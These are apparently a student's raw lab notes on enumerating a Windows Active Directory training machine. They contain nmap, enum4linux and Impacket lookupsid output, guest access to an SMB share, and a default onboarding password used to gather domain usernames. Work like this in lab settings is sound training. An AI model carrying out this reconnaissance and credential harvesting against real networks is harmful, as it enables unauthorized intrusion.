root@ip-10-201-62-243:~# cat initial.nmap
# Nmap 7.80 scan initiated Thu Oct  9 19:30:55 2025 as: nmap -A -T4 -p- -oN initial.nmap 10.201.89.253
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.201.89.253
Host is up (0.00088s latency).
Not shown: 65514 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-09 18:33:09Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: HAYSTACK
|   DNS_Domain_Name: thm.corp
|   DNS_Computer_Name: HayStack.thm.corp
|   DNS_Tree_Name: thm.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-09T18:35:29+00:00
| ssl-cert: Subject: commonName=HayStack.thm.corp
| Not valid before: 2025-10-08T18:22:15
|_Not valid after:  2026-04-09T18:22:15
|_ssl-date: 2025-10-09T18:36:08+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=10/9%Time=68E7FFE9%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
MAC Address: 16:FF:EC:FF:75:7B (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 1 hop
Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: HAYSTACK, NetBIOS user: <unknown>, NetBIOS MAC: 16:ff:ec:ff:75:7b (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-09T18:35:29
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.88 ms 10.201.89.253

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct  9 19:36:09 2025 -- 1 IP address (1 host up) scanned in 314.69 seconds

-------------------------------------------------------------------------------------------------------------

root@ip-10-201-62-243:~# smbclient -L HAYSTACK
Password for [WORKGROUP\root]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Data            Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
root@ip-10-201-62-243:~# 


root@ip-10-201-62-243:~# head -n 500 enum4linux.out
WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Oct  9 20:33:09 2025

 ========================== 
|    Target Information    |
 ========================== 
Target ........... HAYSTACK
RID Range ........ 500-550,1000-1050
Username ......... 'thm.corp//guest'
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ================================================ 
|    Enumerating Workgroup/Domain on HAYSTACK    |
 ================================================ 
[+] Got domain/workgroup name: THM

 ======================================== 
|    Nbtstat Information for HAYSTACK    |
 ======================================== 
Looking up status of 10.201.13.246
	HAYSTACK        <00> -         B <ACTIVE>  Workstation Service
	THM             <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	THM             <1c> - <GROUP> B <ACTIVE>  Domain Controllers
	HAYSTACK        <20> -         B <ACTIVE>  File Server Service
	THM             <1b> -         B <ACTIVE>  Domain Master Browser

	MAC Address = 16-FF-D9-96-9A-45

 ================================= 
|    Session Check on HAYSTACK    |
 ================================= 
[+] Server HAYSTACK allows sessions using username 'thm.corp//guest', password ''

 ======================================= 
|    Getting domain SID for HAYSTACK    |
 ======================================= 
Domain Name: THM
Domain Sid: S-1-5-21-1966530601-3185510712-10604624
[+] Host is part of a domain (not a workgroup)

 ================================== 
|    OS information on HAYSTACK    |
 ================================== 
Use of uninitialized value $os_info in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 464.
[+] Got OS info for HAYSTACK from smbclient: 
[+] Got OS info for HAYSTACK from srvinfo:
	HAYSTACK       Wk Sv PDC Tim NT     
	platform_id     :	500
	os version      :	10.0
	server type     :	0x80102b

 ========================= 
|    Users on HAYSTACK    |
 ========================= 
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ===================================== 
|    Share Enumeration on HAYSTACK    |
 ===================================== 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Data            Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on HAYSTACK
//HAYSTACK/ADMIN$	Mapping: DENIED, Listing: N/A
//HAYSTACK/C$	Mapping: DENIED, Listing: N/A
//HAYSTACK/Data	Mapping: OK, Listing: OK
//HAYSTACK/IPC$	[E] Can't understand response:
NT_STATUS_NO_SUCH_FILE listing \*
//HAYSTACK/NETLOGON	Mapping: OK	Listing: DENIED
//HAYSTACK/SYSVOL	Mapping: OK	Listing: DENIED

 ================================================ 
|    Password Policy Information for HAYSTACK    |
 ================================================ 
[E] Dependent program "polenum.py" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/


 ========================== 
|    Groups on HAYSTACK    |
 ========================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 =================================================================== 
|    Users on HAYSTACK via RID cycling (RIDS: 500-550,1000-1050)    |
 =================================================================== 
[I] Found new SID: S-1-5-21-1966530601-3185510712-10604624
[I] Found new SID: S-1-5-21-464380489-2612913341-2456039557
[I] Found new SID: S-1-5-90
[I] Found new SID: S-1-5-80-3139157870-2983391045-3678747466-658725712
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-21-464380489-2612913341-2456039557 and logon username 'thm.corp//guest', password ''
S-1-5-21-464380489-2612913341-2456039557-500 HAYSTACK\Administrator (Local User)
S-1-5-21-464380489-2612913341-2456039557-501 HAYSTACK\Guest (Local User)
S-1-5-21-464380489-2612913341-2456039557-502 *unknown*\*unknown* (8)
S-1-5-21-464380489-2612913341-2456039557-503 HAYSTACK\DefaultAccount (Local User)
S-1-5-21-464380489-2612913341-2456039557-504 HAYSTACK\WDAGUtilityAccount (Local User)
S-1-5-21-464380489-2612913341-2456039557-505 *unknown*\*unknown* (8)


S-1-5-21-464380489-2612913341-2456039557-513 HAYSTACK\None (Domain Group)
S-1-5-21-464380489-2612913341-2456039557-514 *unknown*\*unknown* (8)

[+] Enumerating users using SID S-1-5-80-3139157870-2983391045-3678747466-658725712 and logon username 'thm.corp//guest', password ''
S-1-5-80-3139157870-2983391045-3678747466-658725712-500 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-501 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-502 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-503 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-504 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-505 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-506 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-507 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-508 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-509 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-510 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-511 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-512 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-513 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-514 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-515 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-516 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-517 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-518 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-519 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-520 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-521 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-522 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-523 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-524 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-525 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-526 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-527 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-528 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-529 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-530 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-531 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-532 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-533 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-534 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-535 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-536 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-537 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-538 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-539 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-540 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-541 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-542 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-543 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-544 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-545 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-546 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-547 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-548 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-549 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-550 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1000 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1001 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1002 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1003 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1004 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1005 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1006 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1007 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1008 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1009 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1010 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1011 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1012 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1013 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1014 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1015 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1016 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1017 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1018 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1019 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1020 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1021 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1022 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1023 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1024 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1025 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1026 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1027 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1028 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1029 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1030 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1031 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1032 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1033 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1034 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1035 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1036 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1037 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1038 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1039 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1040 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1041 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1042 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1043 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1044 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1045 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1046 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1047 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1048 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1049 *unknown*\*unknown* (8)
S-1-5-80-3139157870-2983391045-3678747466-658725712-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-90 and logon username 'thm.corp//guest', password ''
S-1-5-90-500 *unknown*\*unknown* (8)
S-1-5-90-501 *unknown*\*unknown* (8)
S-1-5-90-502 *unknown*\*unknown* (8)
S-1-5-90-503 *unknown*\*unknown* (8)
S-1-5-90-504 *unknown*\*unknown* (8)
S-1-5-90-505 *unknown*\*unknown* (8)
S-1-5-90-506 *unknown*\*unknown* (8)
S-1-5-90-507 *unknown*\*unknown* (8)
S-1-5-90-508 *unknown*\*unknown* (8)
S-1-5-90-509 *unknown*\*unknown* (8)
S-1-5-90-510 *unknown*\*unknown* (8)
S-1-5-90-511 *unknown*\*unknown* (8)
S-1-5-90-512 *unknown*\*unknown* (8)
S-1-5-90-513 *unknown*\*unknown* (8)
S-1-5-90-514 *unknown*\*unknown* (8)
S-1-5-90-515 *unknown*\*unknown* (8)
S-1-5-90-516 *unknown*\*unknown* (8)
S-1-5-90-517 *unknown*\*unknown* (8)
S-1-5-90-518 *unknown*\*unknown* (8)
S-1-5-90-519 *unknown*\*unknown* (8)
S-1-5-90-520 *unknown*\*unknown* (8)
S-1-5-90-521 *unknown*\*unknown* (8)
S-1-5-90-522 *unknown*\*unknown* (8)
S-1-5-90-523 *unknown*\*unknown* (8)
S-1-5-90-524 *unknown*\*unknown* (8)
S-1-5-90-525 *unknown*\*unknown* (8)
S-1-5-90-526 *unknown*\*unknown* (8)
S-1-5-90-527 *unknown*\*unknown* (8)
S-1-5-90-528 *unknown*\*unknown* (8)
S-1-5-90-529 *unknown*\*unknown* (8)
S-1-5-90-530 *unknown*\*unknown* (8)
S-1-5-90-531 *unknown*\*unknown* (8)
S-1-5-90-532 *unknown*\*unknown* (8)
S-1-5-90-533 *unknown*\*unknown* (8)
S-1-5-90-534 *unknown*\*unknown* (8)
S-1-5-90-535 *unknown*\*unknown* (8)
S-1-5-90-536 *unknown*\*unknown* (8)
S-1-5-90-537 *unknown*\*unknown* (8)
S-1-5-90-538 *unknown*\*unknown* (8)
S-1-5-90-539 *unknown*\*unknown* (8)
S-1-5-90-540 *unknown*\*unknown* (8)
S-1-5-90-541 *unknown*\*unknown* (8)
S-1-5-90-542 *unknown*\*unknown* (8)
S-1-5-90-543 *unknown*\*unknown* (8)
S-1-5-90-544 *unknown*\*unknown* (8)
S-1-5-90-545 *unknown*\*unknown* (8)
S-1-5-90-546 *unknown*\*unknown* (8)
S-1-5-90-547 *unknown*\*unknown* (8)
S-1-5-90-548 *unknown*\*unknown* (8)
S-1-5-90-549 *unknown*\*unknown* (8)
S-1-5-90-550 *unknown*\*unknown* (8)
S-1-5-90-1000 *unknown*\*unknown* (8)
S-1-5-90-1001 *unknown*\*unknown* (8)
S-1-5-90-1002 *unknown*\*unknown* (8)
S-1-5-90-1003 *unknown*\*unknown* (8)
S-1-5-90-1004 *unknown*\*unknown* (8)
S-1-5-90-1005 *unknown*\*unknown* (8)
S-1-5-90-1006 *unknown*\*unknown* (8)
S-1-5-90-1007 *unknown*\*unknown* (8)
S-1-5-90-1008 *unknown*\*unknown* (8)
S-1-5-90-1009 *unknown*\*unknown* (8)
S-1-5-90-1010 *unknown*\*unknown* (8)
S-1-5-90-1011 *unknown*\*unknown* (8)
S-1-5-90-1012 *unknown*\*unknown* (8)
S-1-5-90-1013 *unknown*\*unknown* (8)
S-1-5-90-1014 *unknown*\*unknown* (8)
S-1-5-90-1015 *unknown*\*unknown* (8)
S-1-5-90-1016 *unknown*\*unknown* (8)
S-1-5-90-1017 *unknown*\*unknown* (8)
S-1-5-90-1018 *unknown*\*unknown* (8)
S-1-5-90-1019 *unknown*\*unknown* (8)
S-1-5-90-1020 *unknown*\*unknown* (8)
S-1-5-90-1021 *unknown*\*unknown* (8)
S-1-5-90-1022 *unknown*\*unknown* (8)
S-1-5-90-1023 *unknown*\*unknown* (8)
S-1-5-90-1024 *unknown*\*unknown* (8)
S-1-5-90-1025 *unknown*\*unknown* (8)
S-1-5-90-1026 *unknown*\*unknown* (8)
S-1-5-90-1027 *unknown*\*unknown* (8)
S-1-5-90-1028 *unknown*\*unknown* (8)
S-1-5-90-1029 *unknown*\*unknown* (8)
S-1-5-90-1030 *unknown*\*unknown* (8)
S-1-5-90-1031 *unknown*\*unknown* (8)
S-1-5-90-1032 *unknown*\*unknown* (8)
S-1-5-90-1033 *unknown*\*unknown* (8)
S-1-5-90-1034 *unknown*\*unknown* (8)
S-1-5-90-1035 *unknown*\*unknown* (8)
S-1-5-90-1036 *unknown*\*unknown* (8)
S-1-5-90-1037 *unknown*\*unknown* (8)
S-1-5-90-1038 *unknown*\*unknown* (8)
S-1-5-90-1039 *unknown*\*unknown* (8)
S-1-5-90-1040 *unknown*\*unknown* (8)
S-1-5-90-1041 *unknown*\*unknown* (8)
S-1-5-90-1042 *unknown*\*unknown* (8)
S-1-5-90-1043 *unknown*\*unknown* (8)
S-1-5-90-1044 *unknown*\*unknown* (8)
S-1-5-90-1045 *unknown*\*unknown* (8)
S-1-5-90-1046 *unknown*\*unknown* (8)
S-1-5-90-1047 *unknown*\*unknown* (8)
S-1-5-90-1048 *unknown*\*unknown* (8)
S-1-5-90-1049 *unknown*\*unknown* (8)
S-1-5-90-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-21-1966530601-3185510712-10604624 and logon username 'thm.corp//guest', password ''
S-1-5-21-1966530601-3185510712-10604624-500 THM\Administrator (Local User)
S-1-5-21-1966530601-3185510712-10604624-501 THM\Guest (Local User)
S-1-5-21-1966530601-3185510712-10604624-502 THM\krbtgt (Local User)
S-1-5-21-1966530601-3185510712-10604624-503 *unknown*\*unknown* (8)
S-1-5-21-1966530601-3185510712-10604624-504 *unknown*\*unknown* (8)
S-1-5-21-1966530601-3185510712-10604624-505 *unknown*\*unknown* (8)
S-1-5-21-1966530601-3185510712-10604624-506 *unknown*\*unknown* (8)
S-1-5-21-1966530601-3185510712-10604624-507 *unknown*\*unknown* (8)
S-1-5-21-1966530601-3185510712-10604624-508 *unknown*\*unknown* (8)
S-1-5-21-1966530601-3185510712-10604624-509 *unknown*\*unknown* (8)
S-1-5-21-1966530601-3185510712-10604624-510 *unknown*\*unknown* (8)
S-1-5-21-1966530601-3185510712-10604624-511 *unknown*\*unknown* (8)
S-1-5-21-1966530601-3185510712-10604624-512 THM\Domain Admins (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-513 THM\Domain Users (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-514 THM\Domain Guests (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-515 THM\Domain Computers (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-516 THM\Domain Controllers (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-517 THM\Cert Publishers (Local Group)
S-1-5-21-1966530601-3185510712-10604624-518 THM\Schema Admins (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-519 THM\Enterprise Admins (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-520 THM\Group Policy Creator Owners (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-521 THM\Read-only Domain Controllers (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-522 THM\Cloneable Domain Controllers (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-523 *unknown*\*unknown* (8)
S-1-5-21-1966530601-3185510712-10604624-524 *unknown*\*unknown* (8)
S-1-5-21-1966530601-3185510712-10604624-525 THM\Protected Users (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-526 THM\Key Admins (Domain Group)
S-1-5-21-1966530601-3185510712-10604624-527 THM\Enterprise Key Admins (Domain Group)

-------------------------------------------------------------------------------------------------------------

says data share can be read "Listing: OK"

root@ip-10-201-62-243:~# cat dnv0br3b.qsmbclient //HAYSTACK/Data
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> cd onboarding
smb: \onboarding\> ls
  .                                   D        0  Thu Oct  9 20:49:03 2025
  ..                                  D        0  Thu Oct  9 20:49:03 2025
  c44k2ocg.z3q.txt                    A      521  Mon Aug 21 19:21:59 2023
  su2ryj5w.5cb.pdf                    A  4700896  Mon Jul 17 09:11:53 2023
  wxbv04v3.fyf.pdf                    A  3032659  Mon Jul 17 09:12:09 2023

		7863807 blocks of size 4096. 3024313 blocks available
smb: \onboarding\> 

root@ip-10-201-62-243:~# cat dnv0br3b.qjr.txt 
Subject: Welcome to Reset -\ufffdDear <USER>,Welcome aboard! We are thrilled to have you join our team. As discussed during the hiring process, we are sending you the necessary login information to access your company account. Please keep this information confidential and do not share it with anyone.The initial passowrd is: ResetMe123!We are confident that you will contribute significantly to our continued success. We look forward to working with you and wish you the very best in your new role.Best regards,The Reset Teamroot@ip-10-201-62-243:~# 

ResetMe123!

-------------------------------------------------------------------------------------------------------------

from there we find a share that gives us initial creds to try on some user accounts im going to work on the 2 PDFs before moving further I notice 88 was open for kerberos so it is probably worth testing other domain auth features.

the PDFs were boring HR slideshows and they coulda put the secrets of the universe in there im not reading it

Tried a couple ways I know to enu usernames but got stuck and had to find this tool

https://github.com/saisathvik1/OSCP-Cheatsheet



root@ip-10-201-62-243:/opt/impacket/examples# lookupsid.py thm.corp/guest@HAYSTACK
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Password:
[*] Brute forcing SIDs at HAYSTACK
[*] StringBinding ncacn_np:HAYSTACK[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1966530601-3185510712-10604624
498: THM\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: THM\Administrator (SidTypeUser)
501: THM\Guest (SidTypeUser)
502: THM\krbtgt (SidTypeUser)
512: THM\Domain Admins (SidTypeGroup)
513: THM\Domain Users (SidTypeGroup)
514: THM\Domain Guests (SidTypeGroup)
515: THM\Domain Computers (SidTypeGroup)
516: THM\Domain Controllers (SidTypeGroup)
517: THM\Cert Publishers (SidTypeAlias)
518: THM\Schema Admins (SidTypeGroup)
519: THM\Enterprise Admins (SidTypeGroup)
520: THM\Group Policy Creator Owners (SidTypeGroup)
521: THM\Read-only Domain Controllers (SidTypeGroup)
522: THM\Cloneable Domain Controllers (SidTypeGroup)
525: THM\Protected Users (SidTypeGroup)
526: THM\Key Admins (SidTypeGroup)
527: THM\Enterprise Key Admins (SidTypeGroup)
553: THM\RAS and IAS Servers (SidTypeAlias)
571: THM\Allowed RODC Password Replication Group (SidTypeAlias)
572: THM\Denied RODC Password Replication Group (SidTypeAlias)
1008: THM\HAYSTACK$ (SidTypeUser)
1109: THM\DnsAdmins (SidTypeAlias)
1110: THM\DnsUpdateProxy (SidTypeGroup)
1111: THM\3091731410SA (SidTypeUser)
1112: THM\ERNESTO_SILVA (SidTypeUser)
1113: THM\TRACY_CARVER (SidTypeUser)
1114: THM\SHAWNA_BRAY (SidTypeUser)
1115: THM\CECILE_WONG (SidTypeUser)
1116: THM\CYRUS_WHITEHEAD (SidTypeUser)
1117: THM\DEANNE_WASHINGTON (SidTypeUser)
1118: THM\ELLIOT_CHARLES (SidTypeUser)
1119: THM\MICHEL_ROBINSON (SidTypeUser)
1120: THM\MITCHELL_SHAW (SidTypeUser)
1121: THM\FANNY_ALLISON (SidTypeUser)
1122: THM\JULIANNE_HOWE (SidTypeUser)
1123: THM\ROSLYN_MATHIS (SidTypeUser)
1124: THM\DANIEL_CHRISTENSEN (SidTypeUser)
1125: THM\MARCELINO_BALLARD (SidTypeUser)
1126: THM\CRUZ_HALL (SidTypeUser)
1127: THM\HOWARD_PAGE (SidTypeUser)
1128: THM\STEWART_SANTANA (SidTypeUser)
1130: THM\LINDSAY_SCHULTZ (SidTypeUser)
1131: THM\TABATHA_BRITT (SidTypeUser)
1132: THM\RICO_PEARSON (SidTypeUser)
1133: THM\DARLA_WINTERS (SidTypeUser)
1134: THM\ANDY_BLACKWELL (SidTypeUser)
1135: THM\LILY_ONEILL (SidTypeUser)
1136: THM\CHERYL_MULLINS (SidTypeUser)
1137: THM\LETHA_MAYO (SidTypeUser)
1138: THM\HORACE_BOYLE (SidTypeUser)
1139: THM\CHRISTINA_MCCORMICK (SidTypeUser)
1141: THM\3811465497SA (SidTypeUser)
1142: THM\MORGAN_SELLERS (SidTypeUser)
1143: THM\MARION_CLAY (SidTypeUser)
